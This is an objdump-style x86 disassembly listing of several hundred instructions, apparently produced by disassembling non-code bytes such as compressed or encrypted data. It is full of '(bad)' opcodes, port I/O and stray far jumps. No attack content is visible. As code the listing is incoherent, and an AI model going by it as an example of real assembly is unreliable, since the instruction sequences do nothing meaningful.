  44de60:	pop    ds
  44de61:	sbb    eax,esp
  44de63:	mov    edi,0x2610bf7
  44de68:	ficomp WORD PTR [ebp-0x26c48a5]
  44de6e:	mov    cl,0xbf
  44de70:	xor    al,0x25
  44de72:	in     al,0x8
  44de74:	retf   0xb60f
  44de77:	fs mov dl,0xb7
  44de7a:	cmp    ch,dh
  44de7c:	xchg   ebp,eax
  44de7d:	pop    ds
  44de7e:	dec    edi
  44de7f:	jmp    0x909bb4cb
  44de84:	push   ds
  44de85:	pop    ecx
  44de86:	stos   BYTE PTR es:[edi],al
  44de87:	shl    DWORD PTR [esi],0xf0
  44de8a:	js     0x44de2d
  44de8c:	in     al,dx
  44de8d:	mov    al,ds:0xfc8eb12b
  44de92:	rcr    DWORD PTR [ecx],1
  44de94:	add    ebx,edx
  44de96:	sub    al,0x3d
  44de98:	bound  esp,QWORD PTR [esi-0x65]
  44de9b:	(bad)  
  44de9c:	xchg   ebp,eax
  44de9d:	push   esi
  44de9e:	mov    edi,0xeded3528
  44dea3:	or     BYTE PTR [esi+0x2e],dh
  44dea6:	fadd   QWORD PTR [eax+0x74e4d69e]
  44deac:	ss jmp 0x44dec2
  44deaf:	pop    esi
  44deb0:	jp     0x44de4d
  44deb2:	out    dx,al
  44deb3:	sti    
  44deb4:	xchg   edx,eax
  44deb5:	clc    
  44deb6:	outs   dx,BYTE PTR ds:[esi]
  44deb7:	test   al,0x93
  44deb9:	pusha  
  44deba:	mov    dh,0x5b
  44debc:	push   edx
  44debd:	sbb    ebp,ebp
  44debf:	retf   
  44dec0:	jmp    FWORD PTR [edi+0x60]
  44dec3:	addr16 mov cl,0xf9
  44dec6:	or     edi,esp
  44dec8:	idiv   BYTE PTR [ebp+eiz*4+0x5c]
  44decc:	push   eax
  44decd:	mov    eax,ds:0x8ad81e44
  44ded2:	clc    
  44ded3:	adc    DWORD PTR [edx+0x5d],ebx
  44ded6:	mov    ah,0x74
  44ded8:	and    al,0xab
  44deda:	pop    esi
  44dedb:	adc    eax,DWORD PTR [ebp+0x12]
  44dede:	sbb    ch,al
  44dee0:	retf   
  44dee1:	jmp    0x50b5:0x791d458c
  44dee8:	sti    
  44dee9:	arpl   bp,cx
  44deeb:	xor    eax,0x402b9ed6
  44def0:	jmp    0x2b9a827
  44def5:	cmc    
  44def6:	aas    
  44def7:	jge    0x44de82
  44def9:	dec    edi
  44defa:	mov    bl,0x24
  44defc:	xlat   BYTE PTR ds:[ebx]
  44defd:	imul   ebx,esi,0x59047556
  44df03:	out    dx,al
  44df04:	retf   
  44df05:	enter  0xbdfe,0x1c
  44df09:	dec    ecx
  44df0a:	push   ds
  44df0b:	sub    dl,BYTE PTR [edx-0x29]
  44df0e:	push   esi
  44df0f:	push   0x417c8ff2
  44df14:	cwde   
  44df15:	xchg   edi,eax
  44df16:	lods   al,BYTE PTR ds:[esi]
  44df17:	je     0x44df52
  44df19:	test   BYTE PTR [eax+0x2fcf756],bh
  44df1f:	sub    bl,ch
  44df21:	je     0x44df08
  44df23:	out    0xbd,eax
  44df25:	mov    dl,0x6
  44df27:	push   ebp
  44df28:	mov    cl,0xa6
  44df2a:	pop    ebx
  44df2b:	jae    0x44df83
  44df2d:	jmp    FWORD PTR [eax-0x50207600]
  44df33:	mov    BYTE PTR [ecx+edi*1],bl
  44df36:	mov    ah,0x93
  44df38:	mov    DWORD PTR [ebx-0x7e],ecx
  44df3b:	fs mov edx,0x650cdb39
  44df41:	les    edx,FWORD PTR [esi]
  44df43:	out    dx,eax
  44df44:	call   0x1677b2a5
  44df49:	jmp    0x1517ef08
  44df4e:	loope  0x44df66
  44df50:	xchg   edx,eax
  44df51:	retf   
  44df52:	mov    ecx,0xb804df23
  44df57:	dec    esp
  44df58:	outs   dx,DWORD PTR ds:[esi]
  44df59:	cs lahf 
  44df5b:	mov    ds:0x34bd0cd4,al
  44df60:	add    dl,cl
  44df62:	in     al,0x3e
  44df64:	(bad)
  44df67:	icebp  
  44df68:	xlat   BYTE PTR ds:[ebx]
  44df69:	adc    DWORD PTR [esi+eiz*8+0xc],eax
  44df6d:	pop    edx
  44df6e:	lods   eax,DWORD PTR ds:[esi]
  44df6f:	push   esp
  44df70:	cmp    eax,0x14879a3
  44df75:	mov    esp,0x6635c73b
  44df7a:	outs   dx,BYTE PTR ds:[esi]
  44df7b:	(bad)  
  44df7c:	sub    BYTE PTR [edi+0x22],ah
  44df7f:	jg     0x44df65
  44df81:	mov    al,ds:0x4493ad64
  44df86:	mov    ecx,0x987fecb4
  44df8b:	int3   
  44df8c:	inc    ebp
  44df8d:	sbb    bl,BYTE PTR [eax-0x11]
  44df90:	scas   al,BYTE PTR es:[edi]
  44df91:	sbb    ch,dl
  44df93:	faddp  st(7),st
  44df95:	dec    ecx
  44df96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44df97:	fimul  WORD PTR [eax]
  44df99:	mov    esp,0xa2f81013
  44df9e:	iret   
  44df9f:	pop    edi
  44dfa0:	mov    al,ds:0xdf9a1ba6
  44dfa5:	scas   al,BYTE PTR es:[edi]
  44dfa6:	ja     0x44df2b
  44dfa8:	push   edi
  44dfa9:	stc    
  44dfaa:	daa    
  44dfab:	pop    esi
  44dfac:	je     0x44e00a
  44dfae:	mov    edi,0x38d55654
  44dfb3:	out    0xd5,eax
  44dfb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44dfb6:	(bad)  
  44dfb7:	in     al,0x20
  44dfb9:	xchg   ebp,eax
  44dfba:	das    
  44dfbb:	and    eax,0x8e899928
  44dfc0:	xor    esp,0x14
  44dfc3:	push   cs
  44dfc4:	pop    ss
  44dfc5:	xor    eax,0x31667966
  44dfca:	call   0xa5e3:0x62b77756
  44dfd1:	test   al,0xee
  44dfd3:	fistp  WORD PTR [edx]
  44dfd5:	stc    
  44dfd6:	popf   
  44dfd7:	shl    cl,1
  44dfd9:	or     cl,BYTE PTR [ebx+0x25]
  44dfdc:	setle  BYTE PTR [edi+0x772cdeec]
  44dfe3:	xchg   DWORD PTR [ebx],ebx
  44dfe5:	stc    
  44dfe6:	test   eax,esi
  44dfe8:	data16 mov dl,0xc6
  44dfeb:	into   
  44dfec:	mul    BYTE PTR [ebx-0x5e9be85]
  44dff2:	and    al,0x2
  44dff4:	push   cs
  44dff5:	pusha  
  44dff6:	cmp    DWORD PTR cs:[ebp-0x7f],0xffffffbc
  44dffb:	in     al,0x2f
  44dffd:	cmp    eax,0xa2bdb990
  44e002:	jmp    0x44e018
  44e004:	retf   0x31b5
  44e007:	push   esp
  44e008:	xchg   BYTE PTR ds:0xa22d6bd8,ah
  44e00e:	mov    ch,0xf4
  44e010:	retf   
  44e011:	test   ah,0x90
  44e014:	(bad)  
  44e015:	sub    eax,0x9f873691
  44e01a:	sub    DWORD PTR [ebx+0x79],0x32
  44e01e:	adc    al,0x9a
  44e020:	dec    eax
  44e021:	gs mov ah,0xa7
  44e024:	sub    bl,BYTE PTR [ebx+ebp*1+0x9b604b3]
  44e02b:	cli    
  44e02c:	addr16 jo 0x44dfff
  44e02f:	aaa    
  44e030:	test   BYTE PTR ds:0xcfa614b3,ch
  44e036:	or     al,0xf1
  44e038:	jne    0x44e053
  44e03a:	dec    ecx
  44e03b:	repnz dec ecx
  44e03d:	sbb    al,0x76
  44e03f:	shl    DWORD PTR [ecx],1
  44e041:	fld    DWORD PTR [eax]
  44e043:	rcr    BYTE PTR [ecx+0x3f],0x93
  44e047:	sub    al,0x16
  44e049:	iret   
  44e04a:	shr    DWORD PTR [eax],0x76
  44e04d:	adc    eax,0x9d535a90
  44e052:	dec    esp
  44e053:	xchg   esi,eax
  44e054:	loopne 0x44e048
  44e056:	dec    esp
  44e057:	and    al,0xe4
  44e059:	xor    edi,DWORD PTR [edx+0x4f11bec4]
  44e05f:	dec    ebx
  44e060:	add    eax,0x79f3b164
  44e065:	(bad)  
  44e066:	jmp    0xc94dfc98
  44e06b:	aaa    
  44e06c:	or     BYTE PTR [ebx+0x2a7a9e5f],dl
  44e072:	out    dx,eax
  44e073:	inc    edx
  44e074:	sbb    bh,cl
  44e076:	pop    ebp
  44e077:	retf   
  44e078:	aas    
  44e079:	stc    
  44e07a:	leave  
  44e07b:	xchg   esi,eax
  44e07c:	sub    dh,BYTE PTR [edi+0x2a]
  44e07f:	popf   
  44e080:	mov    BYTE PTR [ebp-0x4e],bl
  44e083:	jmp    0x9a24:0x64d1ce8e
  44e08a:	push   ecx
  44e08b:	pop    ebp
  44e08c:	mov    dl,0xa2
  44e08e:	retf   
  44e08f:	pushf  
  44e090:	sub    eax,0xa26f763c
  44e095:	loop   0x44e0c9
  44e097:	adc    eax,0x4bdc4ce
  44e09c:	sbb    BYTE PTR [edx],bh
  44e09e:	pop    es
  44e09f:	fmul   st,st(5)
  44e0a1:	popf   
  44e0a2:	or     ebx,DWORD PTR [ecx]
  44e0a4:	loope  0x44e029
  44e0a6:	add    eax,0x43ace6bd
  44e0ab:	mov    bl,0x72
  44e0ad:	(bad)  
  44e0ae:	mov    edx,0x98a48874
  44e0b3:	cld    
  44e0b4:	neg    BYTE PTR [edi+0x7119db72]
  44e0ba:	xchg   ecx,eax
  44e0bb:	iret   
  44e0bc:	dec    esi
  44e0bd:	xchg   ebx,eax
  44e0be:	cs jne 0x44e0f9
  44e0c1:	pop    ebp
  44e0c2:	mov    ah,0x54
  44e0c4:	aaa    
  44e0c5:	mov    edx,0x4c25680a
  44e0ca:	cs out 0xc3,al
  44e0cd:	sub    ebp,DWORD PTR [ebx+0x69292020]
  44e0d3:	add    ecx,edi
  44e0d5:	sub    eax,0x9cde75e3
  44e0da:	fwait
  44e0db:	and    ebx,ebp
  44e0dd:	jns    0x44e062
  44e0df:	mov    edi,0x701803b6
  44e0e4:	or     dl,BYTE PTR [ebx]
  44e0e6:	mov    al,0x14
  44e0e8:	xchg   edi,eax
  44e0e9:	mov    ?,WORD PTR [eax-0x7fdea9e3]
  44e0ef:	or     esp,edx
  44e0f1:	test   al,0xe0
  44e0f3:	mov    esi,0xcab03638
  44e0f8:	and    cl,bl
  44e0fa:	mov    ebp,0xa676ce12
  44e0ff:	adc    bh,BYTE PTR [esi-0x77]
  44e102:	pushf  
  44e103:	mov    eax,ds:0xbfc2a874
  44e108:	stos   DWORD PTR es:[edi],eax
  44e109:	jmp    0x9632fc1
  44e10e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e10f:	sbb    BYTE PTR [edi-0x1340d8a2],dh
  44e115:	push   eax
  44e116:	movntps XMMWORD PTR [edi-0x60],xmm4
  44e11a:	mov    ebx,0x767cff35
  44e11f:	cwde   
  44e120:	add    edi,eax
  44e122:	ficomp DWORD PTR [edi-0xb43e56a]
  44e128:	xchg   edx,eax
  44e129:	int    0x29
  44e12b:	cs sub esp,esp
  44e12e:	(bad)  
  44e12f:	fdivr  st,st(4)
  44e131:	cmc    
  44e132:	mov    ch,0x2c
  44e134:	ins    DWORD PTR es:[edi],dx
  44e135:	jo     0x44e153
  44e137:	gs pop esp
  44e139:	loopne 0x44e0f8
  44e13b:	hlt    
  44e13c:	push   eax
  44e13d:	cmovns edi,DWORD PTR [edi-0x182ced2b]
  44e144:	rol    BYTE PTR [eax-0x57],1
  44e147:	scas   al,BYTE PTR es:[edi]
  44e148:	dec    edi
  44e149:	cdq    
  44e14a:	sbb    BYTE PTR [esi+0x3c15477],al
  44e150:	push   ds
  44e151:	add    DWORD PTR [ecx-0x545afc8d],eax
  44e157:	out    0x39,eax
  44e159:	push   edx
  44e15a:	sub    dl,BYTE PTR [ecx+0x11a5966b]
  44e160:	lods   al,BYTE PTR ds:[esi]
  44e161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e162:	sub    esi,eax
  44e164:	adc    al,0x2
  44e166:	xor    al,0x6
  44e168:	mov    al,ss:0xbfeb7ec8
  44e16e:	mov    dh,0x14
  44e170:	repnz push ss
  44e172:	fild   WORD PTR [ecx-0x13]
  44e175:	mov    ds:0xd54a3eb,al
  44e17a:	mov    bh,0xc2
  44e17c:	xchg   esi,eax
  44e17d:	js     0x44e17a
  44e17f:	cwde   
  44e180:	int    0x44
  44e182:	mov    cl,0xb4
  44e184:	aas    
  44e185:	inc    ebp
  44e186:	into   
  44e187:	not    WORD PTR [esi]
  44e18a:	cld    
  44e18b:	lods   eax,DWORD PTR ds:[esi]
  44e18c:	xchg   ecx,eax
  44e18d:	xchg   esi,eax
  44e18e:	jge    0x44e178
  44e190:	call   0x7229:0x1d48d486
  44e197:	ins    BYTE PTR es:[edi],dx
  44e198:	adc    bh,BYTE PTR [esi]
  44e19a:	inc    edi
  44e19b:	mov    ah,0x8
  44e19d:	mov    ds:0xd29a3c4b,eax
  44e1a2:	push   ecx
  44e1a3:	ss retf 
  44e1a5:	jo     0x44e177
  44e1a7:	fucomp st(4)
  44e1a9:	jl     0x44e161
  44e1ab:	test   DWORD PTR fs:[eax-0x154afb6a],ebp
  44e1b2:	push   eax
  44e1b3:	out    0x3d,eax
  44e1b5:	mov    ah,0xbd
  44e1b7:	adc    edx,DWORD PTR [esi]
  44e1b9:	cdq    
  44e1ba:	lahf   
  44e1bb:	sbb    eax,0x4a1cf113
  44e1c0:	jae    0x44e151
  44e1c2:	mov    esp,0x109aa1a
  44e1c7:	xor    cl,dl
  44e1c9:	jb     0x44e189
  44e1cb:	xchg   BYTE PTR [esi],bl
  44e1cd:	cdq    
  44e1ce:	push   es
  44e1cf:	das    
  44e1d0:	or     ch,ah
  44e1d2:	dec    esi
  44e1d3:	inc    esp
  44e1d4:	lods   al,BYTE PTR ds:[esi]
  44e1d5:	call   0x685f:0x1bb56efb
  44e1dc:	mov    BYTE PTR [edx+0x24d4ad5a],dl
  44e1e2:	mov    esp,0x95cc0b54
  44e1e7:	gs mov ch,0xeb
  44e1ea:	mov    esp,0xfd5e86e9
  44e1ef:	dec    esi
  44e1f0:	mov    BYTE PTR [ecx],cl
  44e1f2:	jmp    0x44e1b6
  44e1f4:	scas   al,BYTE PTR es:[edi]
  44e1f5:	and    edi,DWORD PTR [eax-0x10]
  44e1f8:	mov    ebp,0xe5fcb09f
  44e1fd:	push   edi
  44e1fe:	mov    al,ds:0xe41ebde8
  44e203:	pop    ss
  44e204:	sbb    cl,BYTE PTR [ecx+0x11]
  44e207:	mov    edi,0x843bba72
  44e20c:	lds    esp,FWORD PTR [esi-0x5ddcff10]
  44e212:	retf   
  44e213:	or     BYTE PTR [eax+eiz*1+0x68f5da4e],ah
  44e21a:	cs inc ebp
  44e21c:	push   ebp
  44e21d:	stc    
  44e21e:	mov    bh,0x94
  44e220:	loope  0x44e238
  44e222:	xor    DWORD PTR [esi-0x3b],ebp
  44e225:	cld    
  44e226:	test   eax,ebp
  44e228:	jge    0x44e23e
  44e22a:	(bad)  
  44e22b:	call   FWORD PTR [edi]
  44e22d:	cmp    DWORD PTR [ecx],esi
  44e22f:	int    0x94
  44e231:	test   BYTE PTR fs:[eax+0x77],ah
  44e235:	test   al,0x1b
  44e237:	lea    ebx,[ebx+0x31]
  44e23a:	aam    0xc3
  44e23c:	jmp    0x44e1d1
  44e23e:	cmp    DWORD PTR [eax],0xd4b0b290
  44e244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e245:	mov    edi,0xb1c52ee8
  44e24a:	xchg   ebp,eax
  44e24b:	jmp    0xe764:0x5cf123a8
  44e252:	pop    DWORD PTR [edx+0x30]
  44e255:	loop   0x44e213
  44e257:	aam    0x2b
  44e259:	jnp    0x44e1e0
  44e25b:	sbb    bl,cl
  44e25d:	mov    ebx,0x79f5ba4d
  44e262:	mov    ebp,0xee9fd9d4
  44e267:	dec    esi
  44e268:	xchg   esp,eax
  44e269:	vandps ymm3,ymm0,YMMWORD PTR [eax]
  44e26d:	icebp  
  44e26e:	stc    
  44e26f:	shr    bh,0xa7
  44e272:	or     ebp,DWORD PTR [ecx]
  44e274:	add    esi,DWORD PTR gs:[edx]
  44e277:	xor    BYTE PTR [ecx-0x260ac1a1],ah
  44e27d:	cmp    eax,0x17fb44b8
  44e282:	lds    ebp,FWORD PTR [esi-0xc3a3e8b]
  44e288:	in     al,dx
  44e289:	or     al,0xb6
  44e28b:	fldenv [ecx]
  44e28d:	dec    ecx
  44e28e:	push   esi
  44e28f:	retf   
  44e290:	push   eax
  44e291:	dec    eax
  44e292:	xchg   DWORD PTR [ebx+ebx*4],ebx
  44e295:	inc    ecx
  44e296:	xor    esp,DWORD PTR [ecx+0x79]
  44e299:	inc    edx
  44e29a:	fcmovnb st,st(2)
  44e29c:	sbb    BYTE PTR [ecx],dl
  44e29e:	mov    edi,0x6b6d682c
  44e2a3:	jp     0x44e2da
  44e2a5:	jo     0x44e244
  44e2a7:	pop    ss
  44e2a8:	pop    ebx
  44e2a9:	inc    eax
  44e2aa:	mov    edi,0xcc1575e4
  44e2af:	retf   0xd03e
  44e2b2:	ror    DWORD PTR [eax],0x5d
  44e2b5:	int3   
  44e2b6:	and    dh,ah
  44e2b8:	sbb    cl,BYTE PTR [ecx+0x48]
  44e2bb:	inc    eax
  44e2bc:	add    eax,0x2f0ab125
  44e2c1:	ins    BYTE PTR es:[edi],dx
  44e2c2:	scas   eax,DWORD PTR es:[edi]
  44e2c3:	repnz sbb eax,0x18331079
  44e2c9:	and    DWORD PTR [ebx+0x6d],ebx
  44e2cc:	sbb    bh,BYTE PTR [ecx+0x4a2f59ec]
  44e2d2:	lahf   
  44e2d3:	sahf   
  44e2d4:	mov    ebx,0x854b4b9b
  44e2d9:	mov    ah,0x56
  44e2db:	dec    esp
  44e2dc:	push   esp
  44e2dd:	cmp    bl,0xf2
  44e2e0:	push   0xda64ee4e
  44e2e5:	pop    ds
  44e2e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e2e7:	xor    DWORD PTR [esi-0x60],eax
  44e2ea:	stos   DWORD PTR es:[edi],eax
  44e2eb:	adc    ch,BYTE PTR ds:0x363d51ce
  44e2f1:	xchg   esi,eax
  44e2f2:	in     eax,dx
  44e2f3:	xor    esp,DWORD PTR [eax+0x2e]
  44e2f6:	out    0x34,al
  44e2f8:	and    bh,BYTE PTR gs:[eax-0x3e81945]
  44e2ff:	out    dx,eax
  44e300:	sar    ch,0x69
  44e303:	and    ebx,ebx
  44e305:	sbb    BYTE PTR [ebx-0xe],0x1b
  44e309:	cdq    
  44e30a:	xchg   ebx,eax
  44e30b:	(bad)  
  44e30c:	loop   0x44e2f2
  44e30e:	ucomiss xmm7,xmm6
  44e311:	fwait
  44e312:	cmp    ebp,DWORD PTR [edx]
  44e314:	inc    edi
  44e315:	in     al,dx
  44e316:	(bad)  
  44e317:	aam    0xa6
  44e319:	cmovne eax,DWORD PTR [esi]
  44e31c:	int3   
  44e31d:	das    
  44e31e:	mov    bh,0x84
  44e320:	scas   al,BYTE PTR es:[edi]
  44e321:	sbb    DWORD PTR [edi-0xe],0xe799e825
  44e328:	aaa    
  44e329:	push   0x917d093
  44e32e:	sub    BYTE PTR [edi-0x4f],dl
  44e331:	std    
  44e332:	push   0x7c854c62
  44e337:	adc    DWORD PTR [edx+0x47],edx
  44e33a:	mov    ?,esi
  44e33c:	dec    edx
  44e33d:	mov    ds:0xc4c97127,al
  44e342:	dec    esp
  44e343:	or     eax,0xe59de00d
  44e348:	pop    ecx
  44e349:	or     eax,0x9511eb4f
  44e34e:	dec    esp
  44e34f:	or     dh,BYTE PTR [edx]
  44e351:	in     al,0xa2
  44e353:	push   esi
  44e354:	sbb    al,0xa1
  44e356:	bound  esp,QWORD PTR ds:0x774c6b1f
  44e35c:	test   esp,esi
  44e35e:	mov    esi,0xcd3515b4
  44e363:	sti    
  44e364:	jge    0x44e302
  44e366:	imul   eax,DWORD PTR [eax],0xffffffe1
  44e369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e36a:	loopne 0x44e2ee
  44e36c:	mov    edi,0x4aad6d40
  44e371:	fwait
  44e372:	loop   0x44e2f8
  44e374:	imul   ebx,DWORD PTR [esi],0xa4106b25
  44e37a:	mov    esp,DWORD PTR [edi-0x6cc2d5b7]
  44e380:	aam    0x4e
  44e382:	scas   al,BYTE PTR es:[edi]
  44e383:	(bad)  
  44e384:	ins    DWORD PTR es:[edi],dx
  44e385:	mov    dh,BYTE PTR [ebx+0x76fd4124]
  44e38b:	mov    eax,ds:0xe974a1d5
  44e390:	mov    edi,0xdf8cc93b
  44e395:	pop    edx
  44e396:	pushf  
  44e397:	push   0x20
  44e399:	dec    ecx
  44e39a:	dec    ebp
  44e39b:	shl    al,0x4d
  44e39e:	add    eax,0x50455531
  44e3a3:	in     eax,0xbb
  44e3a5:	pop    esp
  44e3a6:	dec    edi
  44e3a7:	sbb    cl,BYTE PTR [bx+di]
  44e3aa:	push   cs
  44e3ab:	adc    eax,0x9294ff7b
  44e3b0:	xchg   esp,eax
  44e3b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e3b2:	sti    
  44e3b3:	test   BYTE PTR [eax],ah
  44e3b5:	in     al,dx
  44e3b6:	test   eax,0x4a7dcabf
  44e3bb:	ror    DWORD PTR [eax+0x2f28a488],1
  44e3c1:	popf   
  44e3c2:	adc    edx,edx
  44e3c4:	pushf  
  44e3c5:	fnstsw WORD PTR [ecx-0xe]
  44e3c8:	aad    0x8c
  44e3ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e3cb:	jmp    0x44e3f5
  44e3cd:	mov    ecx,0x1993f158
  44e3d2:	call   0x5c2e012
  44e3d7:	sti    
  44e3d8:	outs   dx,DWORD PTR ds:[esi]
  44e3d9:	bound  edi,QWORD PTR [ebp+0x375f7983]
  44e3df:	mov    gs,WORD PTR [edi]
  44e3e1:	inc    ebx
  44e3e2:	inc    esi
  44e3e3:	hlt    
  44e3e4:	xor    bl,BYTE PTR ss:[edx]
  44e3e7:	xor    al,0x5
  44e3e9:	sahf   
  44e3ea:	push   edi
  44e3eb:	cmp    bh,ch
  44e3ed:	imul   esp,DWORD PTR [ebp+0x27],0xd5a34bc2
  44e3f4:	retf   
  44e3f5:	jmp    0x7fbb:0xd1bff08e
  44e3fc:	push   cs
  44e3fd:	in     al,0xa9
  44e3ff:	js     0x44e3ac
  44e401:	inc    edi
  44e402:	std    
  44e403:	into   
  44e404:	xor    ch,dh
  44e406:	jbe    0x44e42f
  44e408:	outs   dx,BYTE PTR ds:[esi]
  44e409:	pop    edx
  44e40a:	mov    ch,0x64
  44e40c:	(bad)  
  44e40d:	sub    esp,DWORD PTR [eax-0x242cc21d]
  44e413:	xlat   BYTE PTR ds:[ebx]
  44e414:	jp     0x44e42f
  44e416:	std    
  44e417:	inc    ebx
  44e418:	and    eax,0x1694a902
  44e41d:	jmp    0xa2649ff5
  44e422:	jne    0x44e460
  44e424:	xcrypt-ofb (bad)
  44e425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e426:	imul   esp,DWORD PTR [ebp+0x36],0x23
  44e42a:	and    ebp,DWORD PTR [ebp+0x5f]
  44e42d:	cmp    al,BYTE PTR [edx+ebx*1]
  44e430:	mov    bl,0x7d
  44e432:	cs mov dh,0xe2
  44e435:	test   eax,0x9a9d64b9
  44e43a:	xchg   BYTE PTR [eiz*4+0x11e86733],bh
  44e441:	shr    esp,cl
  44e443:	inc    ecx
  44e444:	pop    ds
  44e445:	imul   esp,edx,0x1c444aa9
  44e44b:	fisttp QWORD PTR ds:0xb2bbdba4
  44e451:	repnz pop ds
  44e453:	ss xchg ebx,eax
  44e455:	int    0x9d
  44e457:	sub    al,0x1c
  44e459:	mov    ebx,0xda64a4b8
  44e45e:	lods   eax,DWORD PTR ds:[esi]
  44e45f:	aam    0xd6
  44e461:	fsub   DWORD PTR [ebx]
  44e463:	sub    BYTE PTR [eax],al
  44e465:	mov    ds:0xa19b8027,al
  44e46a:	cmp    BYTE PTR [ebp+0x54311aff],0x1a
  44e471:	sbb    DWORD PTR [ebx],ecx
  44e473:	and    DWORD PTR [eax+0x150074b7],0xffffff85
  44e47a:	cmp    esi,esp
  44e47c:	and    edx,esp
  44e47e:	pop    eax
  44e47f:	sub    ebp,DWORD PTR [ecx]
  44e481:	cmp    ebp,ebp
  44e483:	jl     0x44e461
  44e485:	(bad)  
  44e486:	out    0xeb,al
  44e488:	xlat   BYTE PTR ds:[ebx]
  44e489:	and    eax,0x7cc4d0a7
  44e48e:	pushf  
  44e48f:	push   cs
  44e490:	jge    0x44e4a5
  44e492:	jge    0x44e449
  44e494:	dec    esi
  44e495:	addr16 mov cl,0xec
  44e498:	jmp    0x95a56689
  44e49d:	jnp    0x44e4ba
  44e49f:	in     eax,dx
  44e4a0:	push   ds
  44e4a1:	push   ecx
  44e4a2:	push   edx
  44e4a3:	jge    0x44e4ae
  44e4a5:	(bad)  
  44e4a6:	sub    esi,ebx
  44e4a8:	je     0x44e4c4
  44e4aa:	mov    esi,esi
  44e4ac:	pop    esi
  44e4ad:	lds    esi,FWORD PTR [edi-0x1c99976c]
  44e4b3:	mov    DWORD PTR [ebx+eiz*4],esi
  44e4b6:	mov    edx,0x83907634
  44e4bb:	cmp    eax,0xe8401c05
  44e4c0:	fnsave [ecx]
  44e4c2:	(bad)  
  44e4c3:	cwde   
  44e4c4:	or     al,0x9a
  44e4c6:	in     al,dx
  44e4c7:	aas    
  44e4c8:	neg    DWORD PTR [eax-0x778a168a]
  44e4ce:	sub    eax,0x7bd59aee
  44e4d3:	xchg   ebp,eax
  44e4d4:	ins    DWORD PTR es:[edi],dx
  44e4d5:	push   esi
  44e4d6:	stc    
  44e4d7:	ror    BYTE PTR [esi-0x1c],1
  44e4da:	xchg   esp,eax
  44e4db:	mov    bl,0x48
  44e4dd:	xchg   esi,eax
  44e4de:	ss mov esi,0x4b15849
  44e4e4:	and    al,0x28
  44e4e6:	sbb    BYTE PTR [esi-0xf136c1b],bl
  44e4ec:	aam    0x15
  44e4ee:	cmc    
  44e4ef:	dec    edi
  44e4f0:	les    edx,FWORD PTR [eax-0x290b788f]
  44e4f6:	mov    edi,0x36f22a64
  44e4fb:	aad    0x86
  44e4fd:	out    0xd7,al
  44e4ff:	inc    ebx
  44e500:	lds    ebx,FWORD PTR [ecx+0x14989663]
  44e506:	call   0x7ab4:0xda28b6d6
  44e50d:	sahf   
  44e50e:	repz jno 0x44e492
  44e511:	sub    ch,BYTE PTR [edi-0x40]
  44e514:	aad    0x22
  44e516:	mov    dl,0xfe
  44e518:	int3   
  44e519:	jns    0x44e51d
  44e51b:	jns    0x44e4a6
  44e51d:	shr    ebp,0xe5
  44e520:	xor    BYTE PTR [ecx-0x58],bl
  44e523:	jmp    0xa8ce:0x3a5e4191
  44e52a:	mov    ah,0xe9
  44e52c:	(bad)  
  44e52d:	or     ebp,ebp
  44e52f:	cs pop ss
  44e531:	fwait
  44e532:	fwait
  44e533:	xchg   esp,eax
  44e534:	cmp    DWORD PTR [esi-0x45284ffa],ebp
  44e53a:	jecxz  0x44e4fb
  44e53c:	sbb    BYTE PTR [ebp+0x76de55ed],dh
  44e542:	xchg   ebx,eax
  44e543:	mov    cl,0xf4
  44e545:	mov    ds:0xd130086b,eax
  44e54a:	dec    edi
  44e54b:	xchg   edi,eax
  44e54c:	pusha  
  44e54d:	int3   
  44e54e:	icebp  
  44e54f:	and    al,0x71
  44e551:	and    DWORD PTR [eax-0xd8629ec],esi
  44e557:	outs   dx,DWORD PTR ds:[esi]
  44e558:	xchg   ebp,eax
  44e559:	pop    edi
  44e55a:	sbb    eax,0x5ce943eb
  44e55f:	aas    
  44e560:	or     DWORD PTR [ecx+0x273fc129],edx
  44e566:	mov    ecx,0xf53ebb24
  44e56b:	pmaddwd mm0,mm0
  44e56e:	pushf  
  44e56f:	jmp    0x7a39bb7f
  44e574:	push   ss
  44e575:	jmp    0x7b31668f
  44e57a:	ffree  st(3)
  44e57c:	inc    ebp
  44e57d:	adc    BYTE PTR [eax+esi*2-0x56e5c2a2],bh
  44e584:	das    
  44e585:	mov    ecx,eax
  44e587:	jmp    0x44e5aa
  44e589:	test   eax,0x7c502094
  44e58e:	std    
  44e58f:	arpl   WORD PTR [eax-0x24],bx
  44e592:	or     al,0xf1
  44e594:	iret   
  44e595:	jae    0x44e5f1
  44e597:	mov    ch,0x47
  44e599:	mov    ch,0xb0
  44e59b:	and    al,0xcc
  44e59d:	out    dx,al
  44e59e:	jle    0x44e5cc
  44e5a0:	dec    eax
  44e5a1:	inc    esi
  44e5a2:	sub    BYTE PTR ds:0xa391ac1d,dh
  44e5a8:	iret   
  44e5a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e5aa:	pop    ebx
  44e5ab:	in     eax,0x6b
  44e5ad:	or     BYTE PTR [edx-0x12b62f37],dh
  44e5b3:	push   esi
  44e5b4:	sbb    al,0xc0
  44e5b6:	mov    cl,0xf4
  44e5b8:	mov    al,ds:0xd51cdc31
  44e5bd:	sti    
  44e5be:	stos   DWORD PTR es:[edi],eax
  44e5bf:	hlt    
  44e5c0:	dec    edx
  44e5c1:	out    0x1f,al
  44e5c3:	dec    ebp
  44e5c4:	add    DWORD PTR [eax],ebp
  44e5c6:	mov    dl,0x1
  44e5c8:	popa   
  44e5c9:	inc    ebp
  44e5ca:	imul   eax,DWORD PTR [ebp-0xb],0xffffffd4
  44e5ce:	loop   0x44e5bc
  44e5d0:	or     eax,DWORD PTR [ebp+0x7c]
  44e5d3:	shl    BYTE PTR [ebx],1
  44e5d5:	fisub  DWORD PTR [edx+eiz*2+0x14557ab6]
  44e5dc:	and    al,0x2d
  44e5de:	dec    ebx
  44e5df:	enter  0x6925,0x2e
  44e5e3:	je     0x44e5c9
  44e5e5:	das    
  44e5e6:	mov    ebp,0x9d82a770
